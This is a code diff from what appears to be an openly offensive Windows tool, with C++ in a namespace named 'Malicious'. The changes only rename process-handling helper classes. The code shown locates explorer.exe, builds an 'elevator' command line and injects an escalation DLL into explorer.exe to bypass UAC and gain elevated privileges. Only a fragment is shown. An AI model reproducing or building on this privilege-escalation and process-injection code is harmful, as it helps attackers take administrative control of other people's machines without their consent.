@@ -3,9 +3,7 @@
 
 #include <system/System.hpp>
 #include <system/Uac.hpp>
-#include <system/ThisProcess.hpp>
 #include <system/Process.hpp>
-#include <system/ProcessManager.hpp>
 using namespace System;
 
 #include <ElevatorDll32.hpp>
@@ -45,7 +43,7 @@ namespace Malicious
 					}
 
 					LOG << "What is explorer.exe PID ?";
-					DWORD explorer_pid = System::ProcessManager::GetPidFromName(ELEVATOR_PROCESS_NAME);
+					DWORD explorer_pid = System::Process::GetPidFromName(ELEVATOR_PROCESS_NAME);
 					if(explorer_pid)
 					{
 						LOG << "Injecting escalaion DLL in explorer.exe : " + to_string(explorer_pid);
@@ -55,7 +53,7 @@ namespace Malicious
 						FATAL_ERROR("Process explorer.exe does not exist");
 					}
     				
-                    ThisProcess thisProcess;
+                    System::Process::This thisProcess;
 					using std::string;
 
                     string currentPath = thisProcess.getProgramDir();
@@ -63,7 +61,7 @@ namespace Malicious
                     string elevatorArguments = string(ELEVATOR_PROCESS_NAME) + " " + to_string(explorer_pid) + " " + currentPath+"\\"+std::string(ELEVATOR_DLL_NAME) + " " + programPath;
 					LOG << "Escalation command line : " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;
 
-					Process elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
+					System::Process::Launcher elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
 					LOG << "Waiting elevator to finish";
 					DWORD exitCode = elevatorProcess.wait();					
 
